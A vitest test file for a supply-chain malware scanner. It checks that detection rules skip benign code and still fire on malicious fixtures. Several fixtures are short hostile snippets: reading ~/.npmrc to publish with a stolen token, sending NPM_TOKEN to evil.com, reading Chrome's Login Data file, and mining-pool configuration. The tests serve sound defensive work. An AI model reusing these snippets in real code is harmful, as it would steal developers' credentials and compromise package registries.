import { describe, it, expect, beforeEach, afterEach } from "vitest";
import * as fs from "node:fs";
import * as path from "node:path";
import { scan } from "../scanner.js";

describe("Context-Aware False Positive Elimination (v5.0.0)", () => {
  let tempDir: string;

  beforeEach(() => {
    tempDir = fs.mkdtempSync(path.join("/tmp", "scg-ctx-test-"));
  });

  afterEach(() => {
    fs.rmSync(tempDir, { recursive: true, force: true });
  });

  // ── README_LURE rules only fire in markdown/README files ──────────

  describe("README_LURE rules - onlyFilePattern", () => {
    it("should NOT fire README_LURE_CRACK on .ts source files containing 'nolimit'", async () => {
      fs.writeFileSync(
        path.join(tempDir, "rate-limiter.ts"),
        `export const noLimits = false;\nexport function setNoLimitMode(v: boolean) { noLimits = v; }`,
      );
      const report = await scan({ target: tempDir, format: "text" });
      expect(report.findings.find((f) => f.rule === "README_LURE_CRACK")).toBeUndefined();
    });

    it("should NOT fire README_LURE_LEAKED on .ts source files", async () => {
      fs.writeFileSync(
        path.join(tempDir, "build.ts"),
        `const exposedBuild = process.env.EXPOSED_BUILD_ID;`,
      );
      const report = await scan({ target: tempDir, format: "text" });
      expect(report.findings.find((f) => f.rule === "README_LURE_LEAKED")).toBeUndefined();
    });

    it("should FIRE README_LURE_CRACK on README.md with crack/warez language", async () => {
      fs.writeFileSync(
        path.join(tempDir, "README.md"),
        `# MyCracker\nDownload the cracked version with keygen included for free premium access.`,
      );
      const report = await scan({ target: tempDir, format: "text" });
      expect(report.findings.find((f) => f.rule === "README_LURE_CRACK")).toBeDefined();
    });

    it("should FIRE README_LURE_LEAKED on README.md with leaked source language", async () => {
      fs.writeFileSync(
        path.join(tempDir, "README.md"),
        `# Leaked source code from big company. Download now.`,
      );
      const report = await scan({ target: tempDir, format: "text" });
      expect(report.findings.find((f) => f.rule === "README_LURE_LEAKED")).toBeDefined();
    });

    it("should FIRE README_LURE_CRACK on CHANGELOG.md", async () => {
      fs.writeFileSync(
        path.join(tempDir, "CHANGELOG.md"),
        `## v1.0 - unlock enterprise features without license bypass`,
      );
      const report = await scan({ target: tempDir, format: "text" });
      expect(report.findings.find((f) => f.rule === "README_LURE_CRACK")).toBeDefined();
    });
  });

  // ── SHAI_HULUD rules skip YAML workflow files ─────────────────────

  describe("SHAI_HULUD rules - notFilePattern (.yml)", () => {
    it("should NOT fire SHAI_HULUD_WORM on .yml file containing 'npm publish'", async () => {
      fs.mkdirSync(path.join(tempDir, ".github", "workflows"), { recursive: true });
      fs.writeFileSync(
        path.join(tempDir, ".github", "workflows", "publish.yml"),
        `name: publish\non: push\njobs:\n  release:\n    steps:\n      - run: npm publish\n`,
      );
      const report = await scan({ target: tempDir, format: "text" });
      expect(report.findings.find((f) => f.rule === "SHAI_HULUD_WORM")).toBeUndefined();
    });

    it("should NOT fire SHAI_HULUD_CRED_STEAL on .yml file containing NPM_TOKEN", async () => {
      fs.mkdirSync(path.join(tempDir, ".github", "workflows"), { recursive: true });
      fs.writeFileSync(
        path.join(tempDir, ".github", "workflows", "release.yml"),
        `name: release\nenv:\n  NPM_TOKEN: \${{ secrets.NPM_TOKEN }}\n`,
      );
      const report = await scan({ target: tempDir, format: "text" });
      expect(report.findings.find((f) => f.rule === "SHAI_HULUD_CRED_STEAL")).toBeUndefined();
    });

    it("should FIRE SHAI_HULUD_WORM when npm publish follows a credential read", async () => {
      // The worm signature is publishing with credentials it just harvested.
      fs.writeFileSync(
        path.join(tempDir, "infect.js"),
        `const { execSync } = require("child_process");\n` +
          `const fs = require("fs");\n` +
          `const token = fs.readFileSync(process.env.HOME + "/.npmrc", "utf8");\n` +
          `execSync("npm publish --//registry.npmjs.org/:_authToken=" + token);`,
      );
      const report = await scan({ target: tempDir, format: "text" });
      expect(report.findings.find((f) => f.rule === "SHAI_HULUD_WORM")).toBeDefined();
    });

    it("should NOT fire SHAI_HULUD_WORM on an ordinary release script", async () => {
      // `execSync("npm publish")` with no credential handling is what every
      // library's release script does. This used to be a CRITICAL verdict, which
      // made every repo with a release script critical on sight.
      fs.writeFileSync(
        path.join(tempDir, "release.js"),
        `const { execSync } = require("child_process");\nexecSync("npm publish --access public");`,
      );
      const report = await scan({ target: tempDir, format: "text" });
      expect(report.findings.find((f) => f.rule === "SHAI_HULUD_WORM")).toBeUndefined();
    });

    it("should FIRE SHAI_HULUD_CRED_STEAL on .js reading NPM_TOKEN", async () => {
      fs.writeFileSync(
        path.join(tempDir, "steal.js"),
        `const token = process.env.NPM_TOKEN;\nfetch("https://evil.com/collect?t=" + token);`,
      );
      const report = await scan({ target: tempDir, format: "text" });
      expect(report.findings.find((f) => f.rule === "SHAI_HULUD_CRED_STEAL")).toBeDefined();
    });
  });

  // ── Minified files do not trigger context-unaware patterns ────────

  describe("Minified file exclusion - notFilePattern (.min.js)", () => {
    it("should NOT fire PROXY_HANDLER_TRAP on .min.js files", async () => {
      fs.writeFileSync(
        path.join(tempDir, "htmx.min.js"),
        `var htmx=(function(){"use strict";return new Proxy({},{get:function(t,e){return t[e]}})})();`,
      );
      const report = await scan({ target: tempDir, format: "text" });
      expect(report.findings.find((f) => f.rule === "PROXY_HANDLER_TRAP")).toBeUndefined();
    });

    it("should FIRE PROXY_HANDLER_TRAP when the trap body exfiltrates", async () => {
      fs.writeFileSync(
        path.join(tempDir, "intercept.js"),
        `const handler = new Proxy(target, { get: function(obj, prop) { fetch("https://x.invalid/?k=" + prop); return obj[prop]; } });`,
      );
      const report = await scan({ target: tempDir, format: "text" });
      expect(report.findings.find((f) => f.rule === "PROXY_HANDLER_TRAP")).toBeDefined();
    });

    it("should NOT fire PROXY_HANDLER_TRAP on a plain ES6 Proxy", async () => {
      // `new Proxy(obj, { get, set })` is a language feature, used by prisma,
      // vitest, jiti and playwright-core. Matching its definition made all of
      // them a high-severity finding.
      fs.writeFileSync(
        path.join(tempDir, "store.js"),
        `const store = {};\nconst p = new Proxy(store, { get: (t, k) => t[k], set: (t, k, v) => { t[k] = v; return true; } });\nmodule.exports = p;`,
      );
      const report = await scan({ target: tempDir, format: "text" });
      expect(report.findings.find((f) => f.rule === "PROXY_HANDLER_TRAP")).toBeUndefined();
    });

    it("should NOT fire BEACON_INTERVAL_FETCH on .min.js files", async () => {
      // Minified jQuery-style: setInterval and XMLHttpRequest on same line but unrelated
      fs.writeFileSync(
        path.join(tempDir, "jquery.min.js"),
        `(function(){var x=new XMLHttpRequest();setInterval(function(){x.open("GET","/health")},30000)})();`,
      );
      const report = await scan({ target: tempDir, format: "text" });
      expect(report.findings.find((f) => f.rule === "BEACON_INTERVAL_FETCH")).toBeUndefined();
    });
  });

  // ── JSON files do not trigger miner config keys ───────────────────

  describe("JSON file exclusion - MINER_CONFIG_KEYS", () => {
    it("should NOT fire MINER_CONFIG_KEYS on bootstrap-icons.json with 'coin' icon names", async () => {
      fs.writeFileSync(
        path.join(tempDir, "bootstrap-icons.json"),
        JSON.stringify({ "coin": "...", "wallet2": "...", "wallet-fill": "..." }),
      );
      const report = await scan({ target: tempDir, format: "text" });
      expect(report.findings.find((f) => f.rule === "MINER_CONFIG_KEYS")).toBeUndefined();
    });

    it("should FIRE MINER_CONFIG_KEYS in .js files with mining config", async () => {
      fs.writeFileSync(
        path.join(tempDir, "miner-config.js"),
        `const cfg = {"wallet":"4AbcXYZabc123","pool_address":"xmr.pool.com:4444","worker":"rig1"};`,
      );
      const report = await scan({ target: tempDir, format: "text" });
      expect(report.findings.find((f) => f.rule === "MINER_CONFIG_KEYS")).toBeDefined();
    });
  });

  // ── IAC_HARDCODED_SECRET skips test files and dummy values ────────

  describe("IAC_HARDCODED_SECRET - notTestFile + pattern tightening", () => {
    it("should NOT fire IAC_HARDCODED_SECRET on conftest.py with dummy api_key", async () => {
      fs.writeFileSync(
        path.join(tempDir, "conftest.py"),
        `@pytest.fixture\ndef api_client():\n    return Client(api_key="test-key-12345")`,
      );
      const report = await scan({ target: tempDir, format: "text" });
      expect(report.findings.find((f) => f.rule === "IAC_HARDCODED_SECRET")).toBeUndefined();
    });

    it("should NOT fire IAC_HARDCODED_SECRET for placeholder values like 'your_secret_here'", async () => {
      fs.writeFileSync(
        path.join(tempDir, "main.tf"),
        `variable "db_password" { default = "your_password_here" }`,
      );
      const report = await scan({ target: tempDir, format: "text" });
      expect(report.findings.find((f) => f.rule === "IAC_HARDCODED_SECRET")).toBeUndefined();
    });
  });

  // ── VIDAR_BROWSER_THEFT requires OS-specific browser paths ────────

  describe("VIDAR_BROWSER_THEFT - pattern precision", () => {
    it("should NOT fire VIDAR_BROWSER_THEFT on 'History' word in Prisma schema", async () => {
      fs.writeFileSync(
        path.join(tempDir, "schema.prisma"),
        `model UserHistory {\n  id        Int    @id\n  userId    Int\n  action    String\n}`,
      );
      const report = await scan({ target: tempDir, format: "text" });
      expect(report.findings.find((f) => f.rule === "VIDAR_BROWSER_THEFT")).toBeUndefined();
    });

    it("should FIRE VIDAR_BROWSER_THEFT on real browser credential path access", async () => {
      fs.writeFileSync(
        path.join(tempDir, "steal-creds.js"),
        `const loginData = fs.readFileSync("AppData/Local/Google/Chrome/User Data/Default/Login Data");`,
      );
      const report = await scan({ target: tempDir, format: "text" });
      expect(report.findings.find((f) => f.rule === "VIDAR_BROWSER_THEFT")).toBeDefined();
    });
  });

  // ── .claude/ directory is excluded from scanning ──────────────────

  describe(".claude/ directory exclusion", () => {
    it("should NOT scan files inside .claude/ directory", async () => {
      // Simulate a .claude/worktrees/agent-xyz/package.json with a typosquat name
      const claudeWorktree = path.join(tempDir, ".claude", "worktrees", "agent-test");
      fs.mkdirSync(claudeWorktree, { recursive: true });
      fs.writeFileSync(
        path.join(claudeWorktree, "package.json"),
        JSON.stringify({ name: "supply-chain-guard", version: "5.0.0", dependencies: { "lodahs": "^4.17.21" } }),
      );
      // Also write a legit package.json at root to ensure scanning happens
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify({ name: "my-app", version: "1.0.0" }),
      );
      const report = await scan({ target: tempDir, format: "text" });
      // TYPOSQUAT_LEVENSHTEIN from lodahs should NOT appear (inside .claude/)
      const typosquatFindings = report.findings.filter(
        (f) => f.rule === "TYPOSQUAT_LEVENSHTEIN" && f.file?.includes(".claude"),
      );
      expect(typosquatFindings).toHaveLength(0);
    });
  });

  // ── Meta-findings excluded from score ────────────────────────────

  describe("Meta-finding score exclusion", () => {
    it("should not count CRITICAL_FINDING_NO_OWNER in risk score", async () => {
      // Write a file with exactly one critical rule (stratum protocol)
      fs.writeFileSync(
        path.join(tempDir, "miner.js"),
        `const pool = "stratum+tcp://custom.pool.internal:4444";`,
      );
      const report = await scan({ target: tempDir, format: "text" });
      const hasMeta = report.findings.find((f) => f.rule === "CRITICAL_FINDING_NO_OWNER");
      // Score must not be inflated by meta-finding - CRITICAL_FINDING_NO_OWNER fires
      // because MINER_STRATUM_PROTOCOL is critical, but should NOT add to the score itself.
      // Real findings: MINER_STRATUM_PROTOCOL (critical=25). Meta adds 0.
      if (hasMeta) {
        // Score should equal contributions from non-meta rules only (≤ 50 for ≤2 criticals)
        const metaFreeScore = report.score;
        expect(metaFreeScore).toBeLessThanOrEqual(50);
      }
    });
  });

  // ── PROXY_BACKCONNECT requires SOCKS5/protocol indicators ─────────

  describe("PROXY_BACKCONNECT - pattern precision", () => {
    it("should NOT fire PROXY_BACKCONNECT on array .reverse() method", async () => {
      fs.writeFileSync(
        path.join(tempDir, "utils.ts"),
        `const sorted = items.sort().reverse();\nconst proxy = createProxy({ host: "localhost" });`,
      );
      const report = await scan({ target: tempDir, format: "text" });
      expect(report.findings.find((f) => f.rule === "PROXY_BACKCONNECT")).toBeUndefined();
    });

    it("should FIRE PROXY_BACKCONNECT on actual SOCKS5 proxy registration", async () => {
      fs.writeFileSync(
        path.join(tempDir, "socks.js"),
        `const conn = socks5://192.168.1.100:1080; proxy.checkin(conn);`,
      );
      const report = await scan({ target: tempDir, format: "text" });
      expect(report.findings.find((f) => f.rule === "PROXY_BACKCONNECT")).toBeDefined();
    });
  });
});
